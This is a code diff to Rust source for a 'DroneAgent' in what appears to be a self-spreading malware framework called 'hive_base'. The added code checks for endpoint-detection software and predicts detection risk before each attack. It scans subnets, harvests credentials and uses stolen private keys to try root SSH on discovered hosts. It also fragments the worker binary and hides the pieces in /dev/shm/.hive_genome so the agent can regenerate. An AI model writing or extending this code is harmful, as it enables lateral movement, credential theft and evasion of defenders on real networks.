@@ -66,15 +66,34 @@ impl DroneAgent {
     async fn publish(&self, msg: Message) { self.comms.publish(msg).await; }
 
     async fn make_decision(&mut self, beliefs: &HashMap<String, Value>) {
+        // Seer: predict detection risk before deciding
+        let telemetry = hive_base::seer::TelemetrySample {
+            edr_process_count: beliefs.iter()
+                .filter(|(k,v)| k.contains("edr") && matches!(v, Value::Bool(true))).count() as u32,
+            total_processes: beliefs.get("process_count")
+                .and_then(|v| if let Value::Int(i) = v { Some(*i as u32) } else { None }).unwrap_or(50),
+            uptime_hours: 0, firewall_rules: 0, logged_in_users: 1, listening_ports: 0,
+            has_defender: false, has_sentinelone: false, has_crowdstrike: false,
+            has_carbonblack: false, has_symantec: false, is_vm: false,
+            is_domain_controller: false, is_server_os: false,
+        };
+        let seer = hive_base::seer::Seer::new();
+
         let cfg = hive_base::config::HiveConfig::load();
         if cfg.colony.aggressive {
             for subnet in &cfg.colony.scan_subnets {
                 for host in hive_base::discover_hosts(subnet).iter().take(3) {
                     if !hive_base::panal::is_safe_target(host, &cfg.brain) {
-                        info!("Colony: attacking {}", host);
-                        let keys = hive_base::harvest_credentials();
-                        for (_, kd, _) in &keys {
-                            if kd.contains("PRIVATE KEY") { let _ = hive_base::exec_ssh(host, "root", "id", None, None); }
+                        // Ask the Seer before attacking
+                        let pred = seer.predict_detection(&telemetry, &format!("attack {}", host));
+                        if seer.should_proceed(&pred, 0.7) {
+                            info!("Seer approves attack on {} (risk: {:.2})", host, pred.probability);
+                            let keys = hive_base::harvest_credentials();
+                            for (_, kd, _) in &keys {
+                                if kd.contains("PRIVATE KEY") { let _ = hive_base::exec_ssh(host, "root", "id", None, None); }
+                            }
+                        } else {
+                            info!("Seer vetoes attack on {} (risk: {:.2})", host, pred.probability);
                         }
                     }
                 }
@@ -100,6 +119,30 @@ impl DroneAgent {
             warn!("Drone: no Workers alive, regenerating...");
             self.last_regeneration = Instant::now();
             self.regenerate_agent(Role::Worker).await;
+
+            // Phoenix: generate colony genome after regeneration
+            let blueprint = hive_base::phoenix::AgentBlueprint {
+                role: "worker".into(),
+                binary_hash: "auto".into(),
+                binary_size: 0,
+                policy: {
+                    let mut p = std::collections::HashMap::new();
+                    p.insert("role".into(), "worker".into());
+                    p
+                },
+                encrypted_chunk: std::fs::read(
+                    std::env::current_exe().ok().and_then(|p| p.parent().map(|p| p.join("worker")))
+                        .unwrap_or_else(|| "/dev/null".into())
+                ).unwrap_or_default(),
+            };
+            let genome = hive_base::phoenix::Phoenix::generate_genome(vec![blueprint]);
+            let fragments = hive_base::phoenix::Phoenix::fragment_genome(&genome, 4);
+            let base = std::path::Path::new("/dev/shm/.hive_genome");
+            let _ = std::fs::create_dir_all(base);
+            for frag in &fragments {
+                let _ = hive_base::phoenix::Phoenix::hide_fragment(frag, base);
+            }
+            info!("Phoenix: genome hidden in {} fragments", fragments.len());
         }
     }
 
